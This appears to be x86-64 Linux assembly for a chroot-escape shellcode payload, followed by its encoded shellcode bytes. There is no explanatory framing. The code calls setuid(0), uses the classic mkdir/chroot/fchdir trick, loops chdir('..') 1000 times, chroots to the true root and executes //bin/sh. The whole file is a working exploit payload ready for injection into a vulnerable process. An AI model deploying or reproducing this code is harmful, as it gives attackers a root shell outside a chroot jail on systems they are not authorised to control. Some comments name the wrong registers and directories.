global _start
_start:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor r10, r10
	xor r9, r9
	xor r8, r8
	mov al, 69h			;// Syscall for SETUID
					;// RDI is 0 for setuid(0)
	syscall				;// Call the kernel

	xor rax, rax			;// RAX should be 0 for successful setuid, but it may be -1 on error. This is faster than test/jnz
	push rax
	mov al, 53h			;// Syscall for MKDIR
	mov rdi, 0x646570616373652e	;// ".escaped" in reverse
	push rdi
	mov rdi, rsp			;// pointer to ".escaped" folder string
	xor rcx, rcx
	mov cx, 755o
	mov rsi, rcx			;// rwxr-xr-x
	syscall

	xor rax, rax
	xor rsi, rsi			;// O_RDONLY (000000000)
	xor rdx, rdx
	mov al, 0x2e			;// Open "." string
	push rax			;// Push "\x00\x00\x00\x00\x00\x00\x00." onto stack
	mov rdi, rsp			;// Set RDI to the string pointer
	mov al, 2h			;// Syscall for open
	syscall

	mov r15, rax			;// Move File Descriptor into R15 for later
	push rdx			;// push 0x000000 for null terminator
	mov rdi, 0x646570616373652e	;// ".escaped" in reverse
	push rdi
	mov rdi, rsp			;// pointer to ".escaped" folder string
	xor rax, rax
	mov al, 0xa1			;// Syscall for CHROOT
	syscall

	xor rax, rax
	mov rdi, r15			;// move ".escaped" File Descriptor we saved earlier into RBX
	mov al, 51h			;// Syscall for FCHDIR
	syscall
	
	xor rax, rax
	mov al, 3h			;// Syscall for CLOSE
	mov rdi, r15			;// Move the File Descriptor for ".out" into 
	syscall

	xor rax, rax
	mov ax, 0x2e2e			;// move ".." to stack
	push rax
	mov rdi, rsp			;// EBX now contains a pointer to "..\x00\x00\x00\x00\x00\x00" in human-readable format
	xor r15, r15
	mov r15w, 1000			;// loop 1000 times
	nop
loop1:	xor rax, rax			;// return value should always be 0, but just in case...
	mov al, 50h			;// Syscall for CHDIR
	syscall
	dec r15
	test r15, r15
	jnz loop1

	xor rcx, rcx
	mov cl, 0x2e			;// Set ECX to "."
	push rcx			;// Push "." onto stack
	mov rdi, rsp			;// Pointer to ".out" folder string
	mov al, 0xa1			;// Syscall for CHROOT
	syscall

	nop

	xor rax, rax
	push rax
	mov r15, 0x68732f6e69622f2f	;// "hs/nib//" for "//bin/sh" to execute. Don't asume bash or dash just in case.
	push r15
	mov rdi, rsp			;// Set the char* parameter to the file name //bin/sh
	push rax			;// push 0x00000000
	mov rdx, rsp			;// NULL for the Environment...
	push rdi			;// Push the address of "//bin/sh" for the list of arguments. Executing '//bin/sh //bin/sh'
	mov rsi, rsp
	mov al, 3bh			;// Syscall for EXECVE
	syscall

	xor rax, rax
	xor rdi, rdi
	mov dl, 123d
	mov al, 3ch
	syscall
;// Shellcode:
;// \x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x4d\x31\xd2\x4d\x31\xc9\x4d\x31\xc0\xb0\x69\x0f\x05\x48\x31\xc0\x50\xb0\x53\x48\xbf\x2e\x65\x73\x63\x61\x70\x65\x64\x57\x48\x89\xe7\x48\x31\xc9\x66\xb9\xed\x01\x48\x89\xce\x0f\x05\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\xb0\x2e\x50\x48\x89\xe7\xb0\x02\x0f\x05\x49\x89\xc7\x52\x48\xbf\x2e\x65\x73\x63\x61\x70\x65\x64\x57\x48\x89\xe7\x48\x31\xc0\xb0\xa1\x0f\x05\x48\x31\xc0\x4c\x89\xff\xb0\x51\x0f\x05\x48\x31\xc0\xb0\x03\x4c\x89\xff\x0f\x05\x48\x31\xc0\x66\xb8\x2e\x2e\x50\x48\x89\xe7\x4d\x31\xff\x66\x41\xbf\xe8\x03\x90\x48\x31\xc0\xb0\x50\x0f\x05\x49\xff\xcf\x4d\x85\xff\x75\xf1\x48\x31\xc9\xb1\x2e\x51\x48\x89\xe7\xb0\xa1\x0f\x05\x90\x48\x31\xc0\x50\x49\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x48\x31\xc0\x48\x31\xff\xb2\x7b\xb0\x3c\x0f\x05
